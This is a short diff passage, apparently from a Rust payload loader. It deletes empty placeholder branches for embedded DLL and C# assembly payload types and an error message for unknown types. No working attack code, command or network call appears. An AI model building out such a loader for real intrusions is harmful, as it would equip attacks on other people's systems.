-                    // Do dll stuff
-                } else if ENCTYPE == "CSHARP_ASSEMBLY" {
-                   // Do assembly stuff
-                } else {
-                    eprintln!("[-] Unknown embedded payload type: {}", ENCTYPE);
-                }
-            }
-        }
+    }
 }
